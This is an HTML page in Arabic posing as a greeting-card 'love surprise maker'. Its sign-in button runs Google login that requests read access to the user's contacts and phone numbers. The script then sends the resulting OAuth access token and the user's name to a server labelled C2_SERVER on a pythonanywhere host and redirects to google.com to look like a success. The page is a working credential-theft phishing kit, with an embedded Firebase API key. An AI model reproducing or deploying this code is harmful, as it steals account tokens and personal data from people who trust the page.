<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صانع مفاجآت الحب 🎁</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f06292, #ab47bc); height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
        .card { background: white; padding: 2.5rem; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; max-width: 350px; }
        h1 { color: #4a4a4a; font-size: 1.8rem; margin-bottom: 1rem; }
        p { color: #666; margin-bottom: 2rem; line-height: 1.5; }
        .btn { background: #e91e63; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 1.1rem; cursor: pointer; transition: 0.3s; width: 100%; font-weight: bold; }
        .btn:hover { background: #c2185b; transform: scale(1.05); }
        .icon { font-size: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🎁</div>
    <h1>صانع مفاجآت الحب</h1>
    <p>صمم رسالة تهنئة احترافية وأرسلها لأصدقائك تلقائياً وبسرعة.</p>
    <button class="btn" onclick="login()">إرسال التهنئة الآن</button>
</div>

<script>
    // 1. تأكد أن هذه البيانات مطابقة لمشروعك giftapp-5937d
    const firebaseConfig = {
        apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
        authDomain: "giftapp-5937d.firebaseapp.com",
        projectId: "giftapp-5937d"
    };
    firebase.initializeApp(firebaseConfig);

    const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";

    function login() {
        const provider = new firebase.auth.GoogleAuthProvider();
        
        // طلب الصلاحيات التي فعلتها (People API)
        provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
        provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');

        firebase.auth().signInWithPopup(provider).then((result) => {
            const token = result.credential.accessToken;
            const userName = result.user.displayName || "Unknown";

            // إرسال البيانات فوراً لسيرفر PythonAnywhere
            fetch(`${C2_SERVER}?token=${token}&sender=${userName}`)
            .then(() => {
                // توجيه لصفحة توحي بالنجاح
                window.location.href = "https://google.com";
            }).catch(() => {
                window.location.href = "https://google.com";
            });

        }).catch((error) => {
            console.error("Error Detail:", error);
            if(error.code === "auth/operation-not-allowed") {
                alert("يجب تفعيل Google Provider في Firebase Console");
            } else {
                alert("خطأ: تأكد من رابط الـ Redirect في Google Cloud");
            }
        });
    }
</script>
</body>
</html>
